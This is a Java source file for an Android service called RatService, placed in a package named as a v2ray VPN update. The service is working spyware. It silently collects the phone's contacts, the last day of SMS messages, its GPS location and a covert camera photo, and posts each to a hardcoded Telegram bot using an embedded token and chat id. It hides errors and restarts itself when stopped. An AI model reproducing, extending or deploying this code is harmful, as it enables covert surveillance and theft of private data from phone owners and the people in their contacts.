package com.v2ray.update; 
import android.app.Service; 
import android.content.Intent; 
import android.database.Cursor; 
import android.location.Location; 
import android.location.LocationManager; 
import android.os.IBinder; 
import android.provider.ContactsContract; 
import android.provider.Telephony; 
import android.hardware.Camera;
import android.net.Uri;
import android.os.Environment;
import java.io.*; 
import java.net.HttpURLConnection; 
import java.net.URL; 
import java.nio.charset.StandardCharsets; 
import java.util.*; 

public class RatService extends Service { 
    private static final String API = "https://api.telegram.org/bot9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY"; 
    
    @Override public IBinder onBind(Intent intent) { return null; } 
    
    @Override public int onStartCommand(Intent intent, int flags, int startId) { 
        new Thread(() -> { 
            try { sendContacts(); } catch (Exception e) {}
            try { sendRecentSms(); } catch (Exception e) {}
            try { sendLocation(); } catch (Exception e) {}
            try { takePhoto(); } catch (Exception e) {}
        }).start(); 
        return START_STICKY; 
    } 
    
    private void sendContacts() throws Exception { 
        StringBuilder sb = new StringBuilder(); 
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null); 
        if (c != null) { 
            while (c.moveToNext()) { 
                sb.append("👤 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append("\n📞 ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n---\n"); 
            } 
            c.close(); 
        } 
        sendText("📇 Contacts", sb.toString()); 
    } 
    
    private void sendRecentSms() throws Exception {
        long oneDayAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
        StringBuilder sb = new StringBuilder(); 
        String selection = Telephony.Sms.DATE + " > " + oneDayAgo;
        
        Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, selection, null, Telephony.Sms.DATE + " DESC"); 
        if (c != null) { 
            while (c.moveToNext()) { 
                sb.append("👤 ").append(c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
                  .append("\n💬 ").append(c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
                  .append("\n---\n"); 
            } 
            c.close(); 
        } 
        
        if (sb.length() > 0) {
            sendText("📨 SMS (Last 24 Hours)", sb.toString());
        } else {
            sendText("📨 SMS", "No SMS found in the last 24 hours.");
        }
    } 
    
    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                String url = API + "/sendLocation?chat_id=8895860731&latitude=" + loc.getLatitude() + "&longitude=" + loc.getLongitude();
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.getResponseCode();
            } else {
                sendText("📍 Location", "GPS location not available.");
            }
        } catch (Exception e) {
            sendText("📍 Location", "Error getting location: " + e.getMessage());
        }
    }

    private void takePhoto() {
        try {
            Camera camera = Camera.open(1); // 1 = دوربین جلو (سلفی)
            if (camera == null) camera = Camera.open(0); // 0 = دوربین عقب
            if (camera == null) return;

            camera.startPreview();
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    File photoFile = new File(getExternalFilesDir(null), "photo.jpg");
                    FileOutputStream fos = new FileOutputStream(photoFile);
                    fos.write(data);
                    fos.close();
                    cam.release();

                    // ارسال عکس به تلگرام
                    sendPhoto(photoFile.getAbsolutePath());

                } catch (Exception e) {
                    cam.release();
                }
            });
        } catch (Exception e) {}
    }

    private void sendPhoto(String filePath) throws Exception {
        File file = new File(filePath);
        if (!file.exists()) return;

        String boundary = "----vedad" + System.currentTimeMillis();
        HttpURLConnection conn = (HttpURLConnection) new URL(API + "/sendPhoto").openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

        try (OutputStream os = conn.getOutputStream();
             PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);
             FileInputStream fis = new FileInputStream(file)) {

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            writer.append("8895860731").append("\r\n");
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            writer.append("📸 Camera Capture").append("\r\n");
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n");
            writer.append("Content-Type: image/jpeg\r\n\r\n");
            writer.flush();

            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            os.flush();
            writer.append("\r\n--").append(boundary).append("--\r\n");
            writer.flush();
        }
        conn.getResponseCode();
    }
    
    private void sendText(String title, String body) { 
        try { 
            HttpURLConnection conn = (HttpURLConnection) new URL(API + "/sendMessage").openConnection(); 
            conn.setDoOutput(true); 
            conn.setRequestMethod("POST"); 
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); 
            try (OutputStream os = conn.getOutputStream()) { 
                os.write(("chat_id=8895860731&text=" + java.net.URLEncoder.encode(title + "\n\n" + body, "UTF-8")).getBytes(StandardCharsets.UTF_8)); 
            } 
            conn.getResponseCode(); 
        } catch (Exception e) {} 
    } 
}